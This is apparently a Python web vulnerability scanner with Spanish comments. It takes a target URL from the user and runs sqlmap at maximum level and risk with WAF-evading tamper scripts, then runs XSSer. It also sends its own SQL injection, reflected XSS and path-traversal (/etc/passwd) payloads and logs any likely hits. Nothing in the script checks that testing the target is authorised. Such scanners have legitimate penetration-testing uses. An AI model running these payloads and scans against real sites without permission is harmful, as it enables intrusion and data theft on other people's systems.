import subprocess
import requests
import logging
import os
import time

# Configuración del logging para registrar las actividades en un archivo
logging.basicConfig(filename='vuln_scan.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def run_sqlmap(url):
    try:
        logging.info(f"[*] Ejecutando sqlmap en: {url}")
        subprocess.run([
            "sqlmap", "-u", url, "--batch", "--forms", "--crawl=3",
            "--random-agent", "--tamper=between,space2comment", "--level=5", "--risk=3",
            "--output-dir=./logs/sqlmap", "--technique=BEUSTQ"
        ], check=True)
        logging.info(f"[+] Sqlmap completado para: {url}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error al ejecutar sqlmap: {e}")
    except Exception as e:
        logging.error(f"Error inesperado al ejecutar sqlmap: {e}")

def run_xsser(url):
    try:
        logging.info(f"[*] Ejecutando XSSer en: {url}")
        subprocess.run([
            "xsser", "--url", url, "-g", "/ruta_del_recurso?parametro=XSS", 
            "--payload='<script>alert(\"XSS\");</script>'", "--Coo"
        ], check=True)
        logging.info(f"[+] XSSer completado para: {url}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error al ejecutar XSSer: {e}")
    except Exception as e:
        logging.error(f"Error inesperado al ejecutar XSSer: {e}")

def check_sql_injection(url):
    try:
        logging.info(f"[*] Verificando SQL Injection en: {url}")
        payload = "' OR '1'='1"
        vuln_url = f"{url}?id={payload}"
        response = requests.get(vuln_url, timeout=15)
        if "sql" in response.text.lower() or "mysql" in response.text.lower():
            logging.info(f"[+] Posible SQL Injection en: {vuln_url}")
        else:
            logging.info(f"[-] No se detectó SQL Injection en: {url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error al verificar SQL Injection: {e}")
    except Exception as e:
        logging.error(f"Error inesperado al verificar SQL Injection: {e}")

def check_xss(url):
    try:
        logging.info(f"[*] Verificando XSS en: {url}")
        payload = "<script>alert('XSS')</script>"
        vuln_url = f"{url}?q={payload}"
        response = requests.get(vuln_url, timeout=15)
        if payload in response.text:
            logging.info(f"[+] Posible XSS en: {vuln_url}")
        else:
            logging.info(f"[-] No se detectó XSS en: {url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error al verificar XSS: {e}")
    except Exception as e:
        logging.error(f"Error inesperado al verificar XSS: {e}")

def check_lfi(url):
    try:
        logging.info(f"[*] Verificando LFI en: {url}")
        payload = "../../etc/passwd"
        vuln_url = f"{url}?file={payload}"
        response = requests.get(vuln_url, timeout=15)
        if "root:" in response.text:
            logging.info(f"[+] Posible LFI en: {vuln_url}")
        else:
            logging.info(f"[-] No se detectó LFI en: {url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error al verificar LFI: {e}")
    except Exception as e:
        logging.error(f"Error inesperado al verificar LFI: {e}")

def scan_vulnerabilities(base_url):
    start_time = time.time()
    logging.info(f"Iniciando escaneo de: {base_url}")

    if not os.path.exists('./logs/sqlmap'):
        os.makedirs('./logs/sqlmap')

    run_sqlmap(base_url)
    run_xsser(base_url)
    check_sql_injection(base_url)
    check_xss(base_url)
    check_lfi(base_url)

    elapsed_time = time.time() - start_time
    logging.info(f"Escaneo completado en {elapsed_time:.2f} segundos.")

if __name__ == "__main__":
    target_url = input("Ingrese la URL objetivo: ").strip()
    if not target_url.startswith("http"):
        target_url = "https://" + target_url
    scan_vulnerabilities(target_url)
